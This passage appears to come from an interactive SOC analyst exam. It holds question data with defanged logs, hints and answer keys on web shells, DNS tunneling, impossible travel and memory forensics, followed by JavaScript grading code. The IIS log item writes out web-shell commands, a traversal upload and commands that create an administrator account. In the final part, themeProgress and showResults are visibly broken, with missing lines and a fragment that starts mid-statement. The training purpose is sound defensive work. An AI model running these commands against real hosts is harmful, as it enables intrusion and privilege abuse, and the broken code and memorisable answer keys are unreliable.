exp:"<p><b>Depth difference</b> — firewall logs see addresses and ports; Sysmon ties the connection to an image path, parent process and hash. That difference is exactly why EDR-grade telemetry matters for determining malicious activity.</p><p><b>The indicator</b> — rundll32 is a legitimate Windows tool, which is why an unsigned copy sitting in Users\\Public (a folder anyone can write) is a classic side-loading move, aimed at an unusual port, parented by a scheduled task.</p><p><b>Prefetch + shimcache</b> — Windows records program executions; they tell you the first-run time even if logs were cleared. The firewall cannot name processes, and 8443 by itself is just a port — context makes it suspicious, not the number.</p>"},
{"id":"H21","t":"multi","title":"Strings before the sandbox","pts":2,
kw:["Strings analysis","Packing (UPX)","Mutex artifacts","OSINT","Asset-search engines (Shodan-style)","PE header analysis"],
th:["Memory & Malware Analysis","OSINT, Blocklists & Reputation"],
scn:"Static pass on update32.dll before any detonation. Read the strings dump.",
art:[{l:"strings update32.dll (excerpt)",h:"<pre class='log'>UPX0\nUPX!\nThis program cannot be run in DOS mode.\nGlobal\\WinSvcMtx\nhxxp://192[.]0[.]2[.]144/gate.php\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run</pre>"}],
q:"Select every correct read.",
opts:["UPX0/UPX! section names = packed binary — unpack before judging","Mutex + gate.php URL + a Run-key write = IoCs to share and block now","Pivot: check 192[.]0[.]2[.]144 in OSINT sources (Shodan-style, threat portals) for what else it hosts","The 'This program cannot be run in DOS mode' line proves the file is corrupted","Strings alone prove the file is a Windows system file"],
correct:[0,1,2],
hint:"One line appears in every PE ever made. One conclusion asks strings to do a job they cannot.",
exp:"<p><b>Packing</b> — UPX section names mean the real strings and code are compressed; static reads of a packed file under-report by design, so unpack (or detonate) before verdicts.</p><p><b>IoCs</b> — a mutex name, a command-gate URL and a Run-key path are exactly the shareable, blockable facts you extract from static analysis.</p><p><b>OSINT pivot</b> — asset-search engines and threat portals show what else lives on that IP: sibling campaigns, open ports, other victims.</p><p>The DOS-mode line is the standard PE header stub in every Windows executable — corruption would look like a truncated header, not this. And strings cannot vouch for a file being a system binary; signatures and paths do that.</p>"},
{"id":"H22","t":"multi","title":"health.aspx — the name is the warning","pts":2,
kw:["Web server access logs","Double extensions & PE header","EPP / antivirus exclusions"],
th:["Log Analysis & SIEM"],
scn:"IIS logs on the public portal, this morning. One path appears where it should not exist.",
log:{l:"IIS access log (excerpt)",lines:[
'09:41:02  POST /portal/upload.aspx?path=%2e%2e%2f%2e%2e%2fpublic   200  1,102   203[.]0[.]113[.]55',
'09:41:09  GET  /public/health.aspx                                 200  2       203[.]0[.]113[.]55',
'09:42:31  GET  /public/health.aspx?c=whoami                        200  512     203[.]0[.]113[.]55',
'09:43:02  GET  /public/health.aspx?c=net%20user%20svc%20P%40ss%201%20%2Fadd   200  513   203[.]0[.]113[.]55',
'09:45:10  GET  /public/health.aspx?c=net%20localgroup%20administrators%20svc%20%2Fadd   200  520',
'10:02:44  POST /portal/report.aspx                                 200  4,882,113  203[.]0[.]113[.]55']},
filter:true,
q:"Select every correct statement.",
opts:["Query-string operating-system commands (whoami, net user) on an aspx file = web shell","The upload used ../ traversal into a public virtual directory — that is how health.aspx landed there","Tiny identical-size responses to command GETs, then account changes — interactive hands-on-keyboard use","The 4.8 MB POST to report.aspx at 10:02 is the web shell's exfiltration channel","Add C:\\inetpub\\public to the EPP exclusion list so that these upload alerts stop firing"],
correct:[0,1,2],
hint:"Three statements describe the attack chain in order. One blames the wrong artifact. One suggests making the blindness permanent.",
exp:"<p>The chain: <b>upload with traversal</b> (%2e%2e = ../) drops a script into a web-executable folder; <b>command parameters</b> (c=whoami, c=net user … /add) turn HTTP into a console; the <b>uniform 512-byte replies</b> are command output — someone is typing. The upload name even hid behind an IIS parsing trick rather than a plain double extension (.pdf.exe style), but the effect is the same: an executable wearing a harmless name.</p><p>report.aspx is the portal's real, heavy report job — big size alone is not evidence. And excluding the web root from the EPP is how the next web shell goes unseen: fix the upload path and remove the shell, never the sensor.</p>"},
{"id":"H23","t":"parts","title":"Forty times the baseline at 03:00","pts":3,"seq":true,
kw:["SIEM","Baselines & anomaly detection","DNS tunneling","Root cause analysis (RCA)","Correlation rules"],
th:["Log Analysis & SIEM","DNS & Domain Analysis"],
scn:"03:00 SIEM page: DNS query volume from FIN-DB01 is 40× its nightly baseline — 4,000 queries, mostly TXT. Walk the drill-down in the right order.",
parts:[
{q:"First move inside the SIEM?",
opts:["Break the spike down by host, query type and target zone","Compare with the global average across all months","Close the alert — backups run nightly"],c:0},
{q:"All 4,000 queries are TXT records to tunnel-relay[.]example. Next?",
opts:["Ask EDR which process on DB-01 issues the queries","Restart the DNS service to clear the cache","Block UDP 53 company-wide until Monday"],c:0},
{q:"EDR: svcupd.exe (unsigned, C:\\ProgramData) issues the queries. Then?",
opts:["Isolate DB-01, capture RAM, share the IoCs, start the RCA","Delete svcupd.exe and move on","Whitelist the file — batch jobs sometimes do this"],c:0}],
hint:"Each step narrows one question: where? what? who? — in that order.",
exp:"<p><b>Step 1</b> — a spike is a question; drill-downs are the answers: one host? one record type? one zone? Global averages hide the host; 'backups run nightly' is the excuse the attacker hopes for.</p><p><b>Step 2</b> — one zone + TXT bursts from one host is the tunneling signature; EDR names the <i>process</i> behind the queries, which is the artifact that makes the case. Restarting DNS resets nothing, and blocking all UDP 53 takes the company's name resolution down with it.</p><p><b>Step 3</b> — unsigned binary in ProgramData doing tunneling: isolate while it runs, capture RAM, extract the domain and binary hash as IoCs, and drive a root cause analysis (how it got there, what else it touched).</p>"},
{"id":"H24","t":"multi","title":"The sshd binary that disagrees with its package","pts":2,
kw:["File integrity monitoring (FIM)","File hashing (MD5 / SHA-256)","Evidence quality"],
th:["Host & Endpoint Analysis"],
scn:"Monthly FIM sweep on WEB01 (Debian) runs the package verifier. Two lines differ from the package database.",
art:[{l:"dpkg -V openssh-server",h:"<pre class='log'>??5?????? c /etc/ssh/sshd_config     (config — modified)\n??5??????   /usr/sbin/sshd           (binary — checksum mismatch)\n(package database last updated 40 days ago; no upgrades installed since)</pre>"}],
q:"Select every correct statement.",
opts:["A binary checksum mismatch against the package database = possible tampering or a backdoor","A config file mismatch alone proves nothing — admins edit configs","Reinstall sshd from a trusted source and investigate whether a change window covers it","Any hash mismatch is a routine false positive, because package databases always drift","Only antivirus verdicts count as real evidence in a tampering case like this"],
correct:[0,1,2],
hint:"The flag 'c' marks config files. Ask who is allowed to change which file, and whether anyone scheduled a change.",
exp:"<p><b>The binary</b> — /usr/sbin/sshd must match its package unless an upgrade changed it, and none did. A hash mismatch on a security-critical binary is a tampering candidate: compare against a clean copy (SHA-256), check for a rootkit, and reinstall from a trusted source. File integrity monitoring exists for exactly this moment.</p><p><b>The config</b> — the 'c' flag marks it as a config; sshd_config is meant to be edited, so a mismatch there is normal operations.</p><p>Databases do not 'drift' — binaries change only through changes. And FIM evidence stands on its own; waiting for an antivirus verdict is not how package tampering is proven.</p>"},
{"id":"H25","t":"multi","title":"Two sign-ins, nine countries apart","pts":2,
kw:["Impossible travel / identity logs","SIEM","Persistence mechanisms"],
th:["Log Analysis & SIEM"],
scn:"Identity provider logs for f.neri, this morning. The SIEM stitched them into one story.",
log:{l:"IdP log (excerpt)",lines:[
'09:00:12  SignIn  f.neri   Tunis, TN      198[.]51[.]100[.]71  device: KNOWN   MFA: satisfied',
'09:03:55  MFA reg f.neri   new method: Authenticator (iPhone 15)   from 203[.]0[.]113[.]90',
'09:04:22  SignIn  f.neri   Da Nang, VN    203[.]0[.]113[.]90   device: NEW     MFA: satisfied (new device)',
'09:06:41  Mail    f.neri   inbox rule created: delete mail with subject \"security alert\"',
'09:07:03  SignIn  s.ibrahim  Tunis, TN    device: KNOWN   MFA: satisfied']},
filter:true,
q:"Select every correct statement.",
opts:["Tunis 09:00 then Da Nang 09:04 = impossible travel — one human cannot make that flight","New MFA device + instant sign-in + inbox rule = the account-takeover playbook","The inbox rule hides future security alerts — remove it and rotate credentials now","The Tunis sign-in at 09:00:12 from the known device is the attacker","Geographically spread sign-ins are always normal for users who travel for work"],
correct:[0,1,2],
hint:"Read the sequence as a story: known device → attacker registers their own MFA → attacker signs in → attacker hides the alerts.",
exp:"<p><b>Impossible travel</b> — 9,000 km in four minutes is physical nonsense; the Tunis login (known device, normal MFA) is the real f.neri, and everything after it belongs to the attacker.</p><p><b>The playbook</b> — register a fresh MFA method, sign in with it (MFA 'satisfied', which defeats naive MFA-only alerts), then create a deletion rule for 'security alert' mail so password resets and warnings vanish. Each step alone is explainable; the sequence is not.</p><p>Response: kill the rule, revoke sessions, rotate credentials, re-enroll MFA properly. Travel does happen — but not with a brand-new device registered minutes earlier.</p>"},

{"id":"H26","t":"terminal","title":"Preserve the evidence — your tool, your flags","pts":2,
kw:["tcpdump","Packet capture (pcap)","Display & BPF filters","SPAN port / TAP"],
th:["Network Traffic & Packet Analysis"],
scn:"Legal approved evidence collection on GW-CORE's mirror interface <code>eth0</code> (SPAN port). Everything to and from 203[.]0[.]113[.]44 must be preserved raw, in one file: <code>/tmp/evidence.pcap</code>. The IR team opens it later in Wireshark.",
q:"In the terminal, run the capture command that does exactly this. You choose the tool and the flags.",
term:{banner:"GW-CORE — Ubuntu 22.04 — sudo available\nOperational goal: raw packets to/from 203[.]0[.]113[.]44 on eth0 → /tmp/evidence.pcap",
prompt:"analyst@gw-core:~$",placeholder:"(operational goal above — choose your own command)"},
accept:["^(?:sudo )?tcpdump(?=[\\s\\S]*-i\\s+eth0\\b)(?=[\\s\\S]*\\bhost\\s+203\\.0\\.113\\.44\\b)(?=[\\s\\S]*-w\\s+/tmp/evidence\\.pcap)"],
acceptShow:"tcpdump -i eth0 host 203[.]0[.]113[.]44 -w /tmp/evidence.pcap",
out:"tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n… capture running — filter: host 203[.]0[.]113[.]44 → /tmp/evidence.pcap",
hint:"No tool is named on purpose. The goal has three parts: the right interface, a host filter for both directions, and raw packet output to a file.",
exp:"<p>The canonical answer: <code>tcpdump -i eth0 host 203[.]0[.]113[.]44 -w /tmp/evidence.pcap</code> — interface first, BPF <code>host</code> filter matching traffic in both directions, <code>-w</code> writing raw packets (not text) so Wireshark can dissect them later. In a real console you type the IP without the [.] marks.</p><p>Each element matters for evidence: the wrong interface captures nothing, missing the <code>host</code> keyword either floods the file or drops one direction, and printing instead of writing destroys the packet structure the IR team needs.</p>"},
{"id":"H27","t":"order","title":"Rebuild the morning from six artifacts","pts":3,
kw:["Timeline reconstruction","Windows Event IDs (4624 / 4625 / 4688 / 4720 / 1102)","Service creation (Event 7045)","Newly registered domains"],
th:["Log Analysis & SIEM","Detection Techniques & Response"],
scn:"Six artifacts from three systems arrived out of order. Reconstruct the morning of the incident — the sequence itself is the evidence for the RCA.",
q:"Put the events in chronological order (earliest first).",
items:["09:02 EDR: WINWORD.EXE opens invoice_Q3.pdf.exe → spawns powershell.exe (Event 4688)","09:03 DNS: FIN-WB-11 resolves gate-cdn[.]example — domain registered 4 days ago","09:04 FLOW: TLS beacon FIN-WB-11 → 203[.]0[.]113[.]44:443 begins, 1 per 60 s","09:11 Security log: Event 7045 — new service 'WinSvc' installed; Event 4720 — local account 'svc' created","09:26 EDR: net.exe view and dir on \\\\fs01\\finance (Event 4688)","10:30 FILE: 1.8 GB bulk read from \\\\fs01\\finance, upload to the beacon IP starts"],
hint:"Chain each event to the one it enables: run → resolve → connect → persist → enumerate → collect.",
exp:"<p>The reconstructed chain: document runs PowerShell (entry), the fresh domain is resolved (staging), the beacon starts (C2 live), service plus account created (persistence), share enumeration (reconnaissance inside), then the bulk read and upload (collection/exfiltration).</p><p>Two details carry weight: the domain's 4-day age marks the infrastructure as purpose-built, and 7045 + 4720 together show deliberate persistence before any data was touched. Timeline order is what separates 'some alerts' from a case.</p>"},
{"id":"H28","t":"fib","title":"The executive RCA in five terms","pts":3,
kw:["Root cause analysis (RCA)","CVE / NVD lookup","IoC extraction & sharing","Reporting"],
th:["Detection Techniques & Response"],
scn:"The board wants the incident in five sentences, in their language. Fill each blank with the right term.",
q:"Complete the executive RCA — one term per blank.",
text:"The VPN appliance was missing patch [[0]] (tracked in NVD), which handed the attacker [[1]] without any password. From the appliance they moved with a stolen service account — classic [[2]] — and staged 1.8 GB of finance data. Before leaving, they rebuilt the beacon infrastructure, so every control now watches the new [[3]] we extracted. The report closes with the fix plan: patch, rotate, and keep the IoCs [[4]] across all sites.",
blanks:["CVE-2026-33110","initial access","lateral movement","IoCs","shared"],
bank:["CVE-2026-33110","initial access","lateral movement","IoCs","shared","ransomware","encryption","quarantined","phishing"],
hint:"Chain order: the hole, the entry, the sideways move, the indicators, the distribution.",
exp:"<p><b>CVE-2026-33110</b> — the missing patch is the technical root cause; NVD is where the entry is tracked. <b>Initial access</b> — the unauthenticated appliance exploit was the way in. <b>Lateral movement</b> — stolen service accounts moving appliance → internal servers is the textbook pattern.</p><p><b>IoCs</b> — new C2 domains/IPs/hashes go into every control so recurrence is caught. <b>Shared</b> — IoCs only protect the estate if every site actually receives them.</p><p>The decoys are the boardroom favorites — ransomware, phishing — but the artifacts showed no encryption event and no mail vector: the RCA must match the evidence, not the genre.</p>"},
{"id":"H29","t":"qcm","title":"The verdict that beats the scanner","pts":1,
kw:["EDR","malfind / RWX injection","Memory forensics / RAM capture","False positives"],
th:["Memory & Malware Analysis"],
scn:"FS-01, winlogon.exe. EDR verdict: 'clean, no action required'. Your Volatility pass: a 64 KB PAGE_EXECUTE_READWRITE private region with an MZ header inside winlogon.exe; pslist/psscan agree; flow data shows two small TLS sessions per hour to 203[.]0[.]113[.]44:443.",
q:"Trust which signal — and what next?",
opts:["Trust the EDR verdict — the on-demand scanner is authoritative, so close the case","Trust the deeper evidence — escalate with the memory finding and the flow pair attached","Reboot FS-01 first — injected memory always clears on a restart","Delete the suspicious winlogon.exe file from System32 right away"],
c:1,
hint:"Compare what each tool actually examined. Then ask what a reboot does to memory evidence.",
exp:"<p>The EDR verdict answers 'does a known signature match on disk?' The memory finding answers 'is executable code hiding inside a trusted process right now?' — and it says yes, with RWX + MZ in winlogon, plus a slow beacon that matches the injection. Depth beats breadth here: escalate with both artifacts attached.</p><p>Closing on the scanner's word ignores the strongest evidence on the table (a false negative, not a false positive). Rebooting destroys exactly the memory that proves the case — and winlogon.exe is a real system file; deleting it just breaks the host while the implant elsewhere smiles.</p>"},
{"id":"H30","t":"multi","title":"Defend the verdict in the review board","pts":2,
kw:["Evidence quality","IoC extraction & sharing","Threat hunting","Correlation rules"],
th:["Detection Techniques & Response"],
scn:"The change-review board challenges your 'FIN-DB01 is compromised' verdict. Which artifacts survive cross-examination?",
q:"Select every artifact that supports a defensible verdict.",
opts:["The same C2 domain found independently in DNS logs, flow data and on a second host — a correlated IoC","Injected RWX code with an MZ header inside a trusted process, from memory forensics","EDR finding the same binary hash on a peer host during the IoC sweep (threat hunting)","A user saying their computer has 'felt really slow this week' when interviewed","One single failed logon recorded from the office subnet sometime last week"],
correct:[0,1,2],
hint:"Ask of each artifact: is it reproducible, independent, and specific? Feelings and single routine events are neither.",
exp:"<p><b>Correlated IoC</b> — three independent sources agreeing on one domain is reproducible evidence; no single sensor's bug explains it. <b>Memory forensics</b> — RWX + MZ inside a trusted process is physical evidence of injection, not an opinion. <b>The sweep</b> — the same hash on a peer turns one host into a campaign and proves the infrastructure is real.</p><p>Feelings are leads at best, and a single failed logon from the office subnet is in every enterprise's daily baseline — presenting either as proof is how verdicts collapse in front of a board.</p>"},

"use strict";
/* ===================== engine ===================== */
function byId(id){ return document.getElementById(id); }
function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
function shuffle(a){ for(var i=a.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=a[i]; a[i]=a[j]; a[j]=t; } return a; }
function shuffled(a){ return shuffle(a.slice()); }
function fmtT(s){ var m=Math.floor(s/60), r=s%60; return m+":"+String(r).padStart(2,"0"); }

var S = { order:[], cur:0, ans:{}, started:false, finished:false, manualPause:false, checkPause:false,
          remaining: EXAM.minutes*60, tid:null, reported:false, initName:"" };

function newRec(q){
  var rec = { status:"un", earned:0, hint:false, marks:null, val:null, permOpt:null, permBank:null, permChips:null, permRows:null, permItems:null, permRight:null };
  if(q.t==="qcm"||q.t==="multi") rec.permOpt = shuffled(q.opts.map(function(o,i){return i;}));
  if(q.t==="fib"){ rec.permBank = shuffled(q.bank); rec.val = q.blanks.map(function(){ return ""; }); }
  if(q.t==="dnd"){ rec.permChips = shuffled(q.chips.map(function(c,i){return i;})); rec.val = { bin:{} }; }
  if(q.t==="match"){ rec.permRight = shuffled(q.right.map(function(r,i){return i;})); rec.val = { pair:{} }; }
  if(q.t==="order"||q.t==="rank"){ var p; var n=q.items.length;
    do { p = shuffled(q.items.map(function(x,i){return i;})); } while(n>1 && p.every(function(v,i){return v===i;}));
    rec.permItems = p; rec.val = { list: p.slice() }; }
  if(q.t==="triage"){ rec.permRows = shuffled(q.rows.map(function(r,i){return i;})); rec.val = q.rows.map(function(){ return null; }); }
  if(q.t==="classify"){ rec.permRows = shuffled(q.items.map(function(r,i){return i;})); rec.val = q.items.map(function(){ return null; }); }
  if(q.t==="parts"){ rec.permParts = q.parts.map(function(p){ return shuffled(p.opts.map(function(o,i){return i;})); });
    rec.val = q.parts.map(function(){ return null; }); }
  if(q.t==="terminal"){ rec.val = { cmd:"", ok:false }; }
  return rec;
}
function buildAttempt(){
  S.order = shuffled(QUESTIONS.map(function(q,i){ return i; }));
  S.ans = {}; S.cur = 0;
  QUESTIONS.forEach(function(q){ S.ans[q.id] = newRec(q); });
  S.manualPause=false; S.checkPause=false; S.reported=false; S.finished=false;
  S.remaining = EXAM.minutes*60;
}

/* ---------- checked-state helpers ---------- */
function answeredCount(){ var n=0; QUESTIONS.forEach(function(q){ if(S.ans[q.id].status==="checked") n++; }); return n; }
function skippedCount(){ var n=0; QUESTIONS.forEach(function(q){ if(S.ans[q.id].status==="skipped") n++; }); return n; }
function livePoints(){ var p=0; QUESTIONS.forEach(function(q){ p+=S.ans[q.id].earned; }); return Math.round(p*100)/100; }
function updateChrome(){
  byId("tval").textContent = fmtT(S.remaining);
  byId("sval").textContent = livePoints();
  var done=answeredCount(), skip=skippedCount(), tot=QUESTIONS.length;
  byId("barOk").style.width = (done/tot*100)+"%";
  byId("barSkip").style.width = (skip/tot*100)+"%";
  byId("barwrap").setAttribute("aria-valuenow", Math.round((done+skip)/tot*100));
  byId("barlbl").textContent = done+" of "+tot+" answered · "+skip+" skipped · "+(tot-done-skip)+" remaining";
  var dots = document.querySelectorAll(".dot");
  S.order.forEach(function(qi,pos){
    var d = dots[pos]; if(!d) return;
    var r = S.ans[QUESTIONS[qi].id];
    d.className = "dot"+(r.status==="checked"?" done":"")+(r.status==="skipped"?" skip":"")+(pos===S.cur?" cur":"");
    d.setAttribute("aria-label","Question "+(pos+1)+(r.status==="checked"?", answered":r.status==="skipped"?", skipped":", not answered"));
  });
  byId("indManual").hidden = !S.manualPause;
  byId("indCheck").hidden = !S.checkPause;
  byId("indwrap").hidden = !(S.manualPause||S.checkPause);
}
function startTimer(){ if(S.tid) clearInterval(S.tid); S.tid = setInterval(tick,1000); }
function tick(){
  if(!S.started||S.finished) return;
  if(S.manualPause||S.checkPause){ updateChrome(); return; }
  S.remaining--;
  if(S.remaining<=0){ S.remaining=0; updateChrome(); finishExam("time"); return; }
  updateChrome();
}

function correctSummaryHTML(q){
  function li(arr){ return '<ul class="clean">'+arr.map(function(x){return "<li>"+x+"</li>";}).join("")+"</ul>"; }
  if(q.t==="qcm") return "<p>"+q.opts[q.c]+"</p>";
  if(q.t==="multi") return li(q.correct.map(function(i){ return q.opts[i]; }));
  if(q.t==="dnd") return li(q.bins.map(function(b,bi){
      var its=q.chips.map(function(c,ci){return {h:c.h,b:c.b};}).filter(function(c){return c.b===bi;}).map(function(c){return c.h;});
      return "<b>"+b.label+"</b>: "+(its.join(", ")||"—"); }));
  if(q.t==="match") return li(q.left.map(function(L,i){ return "<b>"+L+"</b> &rarr; "+q.right[q.pairs[i]]; }));
  if(q.t==="order"||q.t==="rank") return li(q.items.map(function(x,i){ return "<b>"+(i+1)+".</b> "+x; }));
  if(q.t==="fib") return li(q.blanks.map(function(b,i){ return "<b>Blank "+(i+1)+":</b> "+b; }));
  if(q.t==="terminal") return "<p>Accepted command(s):</p><pre class='log'>"+esc(q.acceptShow)+"</pre>";
  if(q.t==="parts") return li(q.parts.map(function(p,i){ return "<b>Step "+(i+1)+":</b> "+p.opts[p.c]; }));
  if(q.t==="triage") return li(q.rows.map(function(r,i){ return (i+1)+". "+q.acts[q.correct[i]]+" — "+esc(r.short||""); }));
  if(q.t==="classify") return li(q.items.map(function(it,i){ return (i+1)+". <b>"+(it.m===1?"Malicious":"Benign")+"</b> — "+it.h; }));
  return "";
}
function studentSummaryHTML(q,rec){
  if(rec.status==="skipped") return "<p class='sklist'>&#9888; Skipped — not counted in the score.</p>";
  var v=rec.val;
  function li(arr){ return '<ul class="clean">'+arr.map(function(x){return "<li>"+x+"</li>";}).join("")+"</ul>"; }
  if(q.t==="qcm") return "<p>"+(v===null||v===undefined?"(no answer)":q.opts[v])+"</p>";
  if(q.t==="multi"){ var arr=(v||[]).map(function(i){ return q.opts[i]; }); return arr.length?li(arr):"<p>(no answer)</p>"; }
  if(q.t==="dnd"){ var rows=[]; q.chips.forEach(function(c,ci){ rows.push(c.h+" &rarr; "+(v.bin[ci]!==undefined&&v.bin[ci]>-1 ? esc(q.bins[v.bin[ci]].label) : "left in bank")); }); return li(rows); }
  if(q.t==="match"){ return li(q.left.map(function(L,i){ var r=v.pair[i]; return "<b>"+L+"</b> &rarr; "+(r===undefined||r===null?"(none)":q.right[r]); })); }
  if(q.t==="order"||q.t==="rank"){ return li(v.list.map(function(oi,pos){ return "<b>"+(pos+1)+".</b> "+q.items[oi]; })); }
  if(q.t==="fib"){ return li(q.blanks.map(function(b,i){ return "<b>Blank "+(i+1)+":</b> "+(v[i]||"(none)")+" — correct: "+b; })); }
  if(q.t==="terminal") return "<p>Command: <code>"+esc(v.cmd||"(none)")+"</code></p>";
  if(q.t==="parts"){ return li(q.parts.map(function(p,i){ return "<b>Step "+(i+1)+":</b> "+(v[i]===null?"(no answer)":p.opts[v[i]]); })); }
  if(q.t==="triage"){ return li(q.rows.map(function(r,i){ return (i+1)+". "+(v[i]===null?"(no answer)":q.acts[v[i]]); })); }
  if(q.t==="classify"){ return li(q.items.map(function(it,i){ return (i+1)+". "+(v[i]===null?"(no answer)":(v[i]===1?"Malicious":"Benign"))+" — correct: "+(it.m===1?"Malicious":"Benign"); })); }
  return "";
}

function elementsTotal(q){
  if(q.t==="qcm"||q.t==="terminal") return 1;
  if(q.t==="multi") return q.correct.length;
  if(q.t==="dnd") return q.chips.length;
  if(q.t==="match") return q.left.length;
  if(q.t==="order"||q.t==="rank") return q.items.length;
  if(q.t==="fib") return q.blanks.length;
  if(q.t==="parts") return q.parts.length;
  if(q.t==="triage") return q.rows.length;
  if(q.t==="classify") return q.items.length;
  return 1;
}
function countOK(rec){ var n=0; if(rec.marks) for(var k in rec.marks){ if(rec.marks[k]==="ok") n++; } return n; }
function countBAD(rec){ var n=0; if(rec.marks) for(var k in rec.marks){ if(rec.marks[k]==="bad") n++; } return n; }

/* ===================== capture + check ===================== */
function captureFromDOM(q,rec){
  var root = byId("ansbody"); if(!root) return;
  if(q.t==="qcm"){ var r=root.querySelector('input[type=radio]:checked'); rec.val = r?Number(r.value):null; }
  if(q.t==="multi"){ rec.val = Array.prototype.map.call(root.querySelectorAll('input[type=checkbox]:checked'),function(x){return Number(x.value);}); }
  if(q.t==="parts"){ q.parts.forEach(function(p,pi){ var r=root.querySelector('input[name="a-'+q.id+'-'+pi+'"]:checked'); rec.val[pi]=r?Number(r.value):null; }); }
  if(q.t==="fib"){ root.querySelectorAll(".bsel").forEach(function(s){ rec.val[Number(s.dataset.b)]=s.value; }); }
  if(q.t==="triage"){ root.querySelectorAll(".tsel").forEach(function(s){ var v=s.value; rec.val[Number(s.dataset.r)] = v===""?null:Number(v); }); }
  if(q.t==="terminal"){ var tin=byId("tin-"+q.id); if(tin && tin.value) { rec.val.cmd = tin.value; } }
}
function termNorm(c){ return String(c||"").replace(/\[\.\]/g,".").replace(/\s+/g," ").trim().toLowerCase(); }
function termAccept(q,cmd){
  var c = termNorm(cmd);
  return (q.accept||[]).some(function(re){ try{ return new RegExp(re,"i").test(c); }catch(e){ return false; } });
}

function doCheck(){
  var qi=S.order[S.cur], q=QUESTIONS[qi], rec=S.ans[q.id];
  if(rec.status==="checked") return;
  captureFromDOM(q,rec);
  var marks={}, elOK=0, n=elementsTotal(q), each=q.pts/n, ok=false;
  if(q.t==="qcm"){ ok = rec.val===q.c; marks[q.c]="ok"; if(!ok&&rec.val!==null) marks[rec.val]="bad"; elOK=ok?1:0; }
  else if(q.t==="multi"){ var cs={}; q.correct.forEach(function(i){cs[i]=1;});
    (rec.val||[]).forEach(function(i){ if(cs[i]){marks[i]="ok";elOK++;} else marks[i]="bad"; });
    q.correct.forEach(function(i){ if(!marks[i]) marks[i]="part"; }); }
  else if(q.t==="dnd"){ q.chips.forEach(function(c,ci){ var b=rec.val.bin[ci]; var inBank=(b===undefined||b===-1);
      if(c.b===-1){ if(inBank){marks[ci]="ok";elOK++;} else {marks[ci]="bad"; mbin(marks,b);} }
      else if(b===c.b){marks[ci]="ok";elOK++;}
      else if(inBank){marks[ci]="part";}
      else{marks[ci]="bad"; mbin(marks,b);} });
    function mbin(mm,b){ var k="bin"+b; mm[k]="bad"; } }
  else if(q.t==="match"){ q.left.forEach(function(L,li){ var r=rec.val.pair[li];
      if(r!==undefined&&r!==null&&r===q.pairs[li]){marks["l"+li]="ok";elOK++;}
      else if(r===undefined||r===null){marks["l"+li]="part";}
      else{marks["l"+li]="bad";} }); }
  else if(q.t==="order"||q.t==="rank"){ rec.val.list.forEach(function(oi,pos){ if(oi===pos){marks["p"+oi]="ok";elOK++;}else{marks["p"+oi]="bad";} }); }
  else if(q.t==="fib"){ q.blanks.forEach(function(b,i){ if(rec.val[i]===b){marks["b"+i]="ok";elOK++;}else{marks["b"+i]=rec.val[i]===""?"part":"bad";} }); }
  else if(q.t==="terminal"){ ok = termAccept(q, rec.val.cmd); if(ok) rec.val.ok=true; marks["t"]=ok?"ok":"bad"; elOK=ok?1:0; }
  else if(q.t==="parts"){ q.parts.forEach(function(p,pi){ var v=rec.val[pi];
      if(v===p.c){marks[pi+"_"+v]="ok";elOK++;}
      else if(v===null||v===undefined){marks[pi+"_"+p.c]="part";}
      else{marks[pi+"_"+v]="bad"; marks[pi+"_"+p.c]="ok";} }); }
  else if(q.t==="triage"){ q.rows.forEach(function(r,ri){ var v=rec.val[ri];
      if(v!==null&&v===q.correct[ri]){marks["r"+ri]="ok";elOK++;}
      else{marks["r"+ri]=v===null?"part":"bad";} }); }
  else if(q.t==="classify"){ q.items.forEach(function(it,i){ var v=rec.val[i];
      if(v!==null&&v===it.m){marks["i"+i]="ok";elOK++;}
      else{marks["i"+i]=v===null?"part":"bad";} }); }
  var earned = each*elOK;
  if(rec.hint) earned = Math.max(0, earned - q.pts*0.10);
  earned = Math.round(earned*100)/100;
  rec.marks = marks; rec.earned = Math.min(earned,q.pts); rec.status="checked";
  S.checkPause = true;
  renderQ(); updateChrome();
  var fb = byId("fbpanel"); if(fb) fb.scrollIntoView({behavior:"smooth",block:"nearest"});
}

function doSkip(){
  var qi=S.order[S.cur], rec=S.ans[QUESTIONS[qi].id];
  rec.status="skipped"; updateChrome();
  if(S.cur < QUESTIONS.length-1) gotoQ(S.cur+1);
  else openSubmitModal(true);
}
function doHint(){
  var qi=S.order[S.cur], rec=S.ans[QUESTIONS[qi].id];
  if(rec.hint) return;
  rec.hint=true;
  var t=byId("hinttext"); if(t) t.hidden=false;
  var b=byId("btnHint"); if(b) b.disabled=true;
  updateChrome();
}
function doRevise(){
  var qi=S.order[S.cur], rec=S.ans[QUESTIONS[qi].id];
  if(rec.status!=="checked") return;
  rec.status="un"; rec.earned=0; rec.marks=null;
  renderQ(); updateChrome();
}
function gotoQ(pos){
  /* NOTE: check-pause is intentionally NOT cleared here. Per spec, only the
     "Next" button resumes the timer after a Check-pause. */
  S.cur=Math.max(0,Math.min(QUESTIONS.length-1,pos));
  renderQ();
  window.scrollTo({top:0,behavior:"smooth"});
}
function pauseManual(){
  if(S.finished) return;
  S.manualPause=!S.manualPause;
  byId("pauseOverlay").hidden=!S.manualPause;
  byId("exwrap").classList.toggle("blurred",S.manualPause);
  var b=byId("btnPause"); b.innerHTML = S.manualPause? "&#9654; Resume" : "&#9208; Pause";
  b.setAttribute("aria-pressed",String(S.manualPause));

}

function themeProgress(){
  var th={};

    (q.th||[]).forEach(function(t){

      if(r.status!=="skipped"){ th[t].max+=1; th[t].got+= r.earned/q.pts; }
    });
  });
  return th;
}
function showResults(reason){

      : '<div class="failpanel"><h2>&#10007; FAIL — '+EXAM.passMark+'% needed</h2><p>You did not reach the pass mark. Review the report below, focus on the themes where you lost points, then press <b>Retake Exam</b>. Questions and answers will be reshuffled.</p></div>')+
    '<div class="statrow">'+
    '<div class="stat"><div class="v">'+score+' / '+total+'</div><div class="k">exercises-worth (skipped excluded)</div></div>'+
    '<div class="stat"><div class="v">'+(Math.round(ptsEarn*10)/10)+' / '+(Math.round(ptsMax*10)/10)+'</div><div class="k">raw points (answered)</div></div>'+
    '<div class="stat"><div class="v">'+answered+' / '+QUESTIONS.length+'</div><div class="k">answered</div></div>'+
    '<div class="stat"><div class="v">'+skippedCount()+'</div><div class="k">skipped (not counted)</div></div>'+
